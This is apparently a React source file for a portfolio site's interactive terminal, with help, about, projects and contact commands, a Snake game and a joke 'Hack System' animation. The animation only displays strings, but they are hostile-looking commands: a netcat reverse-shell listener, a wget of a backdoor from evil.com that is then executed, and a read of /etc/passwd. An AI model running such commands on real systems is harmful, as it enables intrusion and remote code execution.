"use client";

import React, { useState, useEffect, useRef } from 'react';
import Image from 'next/image';
import { TerminalContainer, CommandProcessor, type CommandOutput } from './terminal-components';
import { SnakeGame } from './games';

export const Terminal: React.FC = () => {
  const [history, setHistory] = useState<Array<{
    command: string;
    output: CommandOutput;
    timestamp: Date;
  }>>([{
    command: 'help',
    output: { 
      type: 'list', 
      content: [
        'Available commands:',
        '  help       - See a list of available commands',
        '  clear      - Clear the terminal',
        '  about      - Display info about me',
        '  projects   - List available projects',
        '  photography - Navigate to photo portfolio (coming soon)',
        '  contact    - Show contact information'
      ], 
      command: 'help' 
    },
    timestamp: new Date()
  }]);
  const [currentInput, setCurrentInput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showCursor, setShowCursor] = useState(true);
  const [showGameButtons, setShowGameButtons] = useState(false);
  const [isHacking, setIsHacking] = useState(false);
  const [hasMadeSelection, setHasMadeSelection] = useState(false);
  const [showSnakeGame, setShowSnakeGame] = useState(false);
  const commandProcessor = useRef(new CommandProcessor());
  const historyEndRef = useRef<HTMLDivElement>(null);

  // Auto-scroll to bottom when new commands are added
  useEffect(() => {
    historyEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  // Cursor blinking effect
  useEffect(() => {
    const cursorInterval = setInterval(() => {
      setShowCursor(prev => !prev);
    }, 500); // Blink every 500ms
    return () => clearInterval(cursorInterval);
  }, []);

  const handleCommandSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!currentInput.trim() || isLoading) return;
    
    const command = currentInput.trim();
    setCurrentInput('');
    setIsLoading(true);
    
    // Add command to history immediately
    const newEntry = {
      command,
      output: { type: 'text' as const, content: '', command: '' } as CommandOutput,
      timestamp: new Date()
    };
    
    setHistory(prev => [...prev, newEntry]);
    
    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 100));
    
    // Execute command
    const output = commandProcessor.current.executeCommand(command);
    
    // Handle special clear command
    if (output.content === 'CLEAR_TERMINAL') {
      handleClear();
      setIsLoading(false);
      return;
    }

    // Handle special continue-game command
    if (output.content === 'CONTINUE_GAME') {
      if (hasMadeSelection) {
        setHistory(prev => prev.map((entry, index) => 
          index === prev.length - 1 
            ? { ...entry, output: { type: 'error', content: 'Did you really think you could change your decision? There is no going back. Unless...', command: 'continue-game' } }
            : entry
        ));
        setIsLoading(false);
        
        // Maintain input focus after failed continue-game
        setTimeout(() => {
          const inputElement = document.querySelector('input[type="text"]') as HTMLInputElement;
          if (inputElement) {
            inputElement.focus();
          }
        }, 50);
        return;
      }
      setShowGameButtons(true);
      setIsLoading(false);
      return;
    }
    
    // Update the entry with the output
    setHistory(prev => prev.map((entry, index) => 
      index === prev.length - 1 ? { ...entry, output } : entry
    ));
    
    setIsLoading(false);
    
    // Automatically refocus the input field
    setTimeout(() => {
      const inputElement = document.querySelector('input[type="text"]') as HTMLInputElement;
      if (inputElement) {
        inputElement.focus();
      }
    }, 50);
  };

  const handleClear = () => {
    // Clear everything - no initial help message
    setHistory([]);
    setShowGameButtons(false);
    setIsHacking(false);
    setHasMadeSelection(false);
    setShowSnakeGame(false);
    commandProcessor.current.setCurrentProject(null);
    
    // Maintain input focus after clearing
    setTimeout(() => {
      const inputElement = document.querySelector('input[type="text"]') as HTMLInputElement;
      if (inputElement) {
        inputElement.focus();
      }
    }, 50);
  };

  const handleHackSystem = () => {
    setIsHacking(true);
    setShowGameButtons(false);
    setHasMadeSelection(true);
    
    // Add initial hack command to terminal
    setHistory(prev => [...prev, {
      command: 'hack-system',
      output: { type: 'text', content: '', command: 'hack-system' },
      timestamp: new Date()
    }]);

    // Start hacking animation sequence in terminal
    const hackSteps = [
      { command: 'sudo nmap -sS -O target.com', output: 'Scanning for open ports...', duration: 1500 },
      { command: 'python3 exploit.py --target 192.168.1.1', output: 'Exploiting vulnerability CVE-2023-1234...', duration: 2000 },
      { command: 'nc -lvp 4444', output: 'Listening for reverse shell connection...', duration: 1500 },
      { command: 'wget http://evil.com/backdoor.sh', output: 'Downloading payload...', duration: 1000 },
      { command: 'chmod +x backdoor.sh && ./backdoor.sh', output: 'Executing backdoor...', duration: 2000 },
      { command: 'cat /etc/passwd', output: 'Accessing system files...', duration: 1000 },
      { command: 'ls -la /top-secret/', output: 'Accessing secure directory...', duration: 1500 }
    ];

    let currentStep = 0;

    const addHackStep = () => {
      if (currentStep < hackSteps.length) {
        const step = hackSteps[currentStep];
        
        // Add the command
        setHistory(prev => [...prev, {
          command: step.command,
          output: { type: 'text', content: '', command: step.command },
          timestamp: new Date()
        }]);

        // Add the output after a short delay
        setTimeout(() => {
          setHistory(prev => prev.map((entry, index) => 
            index === prev.length - 1 
              ? { ...entry, output: { type: 'text', content: step.output, command: step.command } }
              : entry
          ));

          currentStep++;
          if (currentStep < hackSteps.length) {
            setTimeout(addHackStep, step.duration);
          } else {
            // Hack complete - show secret folder
            setTimeout(() => {
              setHistory(prev => [...prev, {
                command: 'ls -la /top-secret/',
                output: {
                  type: 'list',
                  content: [
                    'Access granted to: /top-secret/',
                    '',
                    'Available files:',
                    '  secret-recipe.txt',
                    '  embarrassing-photos/',
                    '  todo-list.txt',
                    '  cat-videos/',
                    '  backup-passwords.txt',
                    '',
                    'Type `cd [file-or-folder-name]` to explore a file or folder.'
                  ],
                  command: 'ls -la /top-secret/'
                },
                timestamp: new Date()
              }]);
              setIsHacking(false);
              
              // Maintain input focus after hack completes
              setTimeout(() => {
                const inputElement = document.querySelector('input[type="text"]') as HTMLInputElement;
                if (inputElement) {
                  inputElement.focus();
                }
              }, 100);
            }, 1000);
          }
        }, 500);
      }
    };

    // Start the hacking sequence
    setTimeout(addHackStep, 1000);
  };

  const handleOpenGame = () => {
    setShowGameButtons(false);
    setHasMadeSelection(true);
    setShowSnakeGame(true);
    
    // Add game launch message to terminal
    setHistory(prev => [...prev, {
      command: 'open-game',
      output: {
        type: 'text',
        content: 'Launching Snake Game... 🐍\n\nUse WASD or Arrow Keys to control the snake.\nPress ESC to close the game.',
        command: 'open-game'
      },
      timestamp: new Date()
    }]);
  };

  const handleCloseGame = () => {
    setShowSnakeGame(false);
    
    // Add game closed message to terminal
    setHistory(prev => [...prev, {
      command: 'close-game',
      output: {
        type: 'text',
        content: 'Game closed. Terminal restored.',
        command: 'close-game'
      },
      timestamp: new Date()
    }]);
    
    // Restore input focus
    setTimeout(() => {
      const inputElement = document.querySelector('input[type="text"]') as HTMLInputElement;
      if (inputElement) {
        inputElement.focus();
      }
    }, 100);
  };

  return (
    <>
      <TerminalContainer
        history={history}
        currentInput={currentInput}
        onInputChange={setCurrentInput}
        onSubmit={handleCommandSubmit}
        isLoading={isLoading}
        showCursor={showCursor}
        historyEndRef={historyEndRef}
      />
      

      
      {/* Game Buttons - only visible after continue-game command */}
      {showGameButtons && (
        <div className="absolute bottom-8 left-1/2 transform -translate-x-1/2 z-20 animate-fade-in">
          <div className="flex gap-12">
            <button
              onClick={handleHackSystem}
              className="relative hover:scale-105 transition-transform duration-200"
              aria-label="Hack System"
            >
              <Image
                src="/pixel-art/button-1.png"
                alt="Hack System button"
                width={200}
                height={100}
                className="cursor-pointer"
              />
              <span className="absolute inset-0 flex items-center justify-center pt-2 text-white minecraft-text text-lg font-bold">
                Hack System
              </span>
            </button>
            <button
              onClick={handleOpenGame}
              className="relative hover:scale-105 transition-transform duration-200"
              aria-label="Open Game"
            >
              <Image
                src="/pixel-art/button-1.png"
                alt="Open Game button"
                width={200}
                height={100}
                className="cursor-pointer"
              />
              <span className="absolute inset-0 flex items-center justify-center pt-2 text-white minecraft-text text-lg font-bold">
                Open Game
              </span>
            </button>
          </div>
        </div>
      )}
      
      {/* Snake Game Overlay */}
      {showSnakeGame && (
        <SnakeGame onClose={handleCloseGame} />
      )}
    </>
  );
};
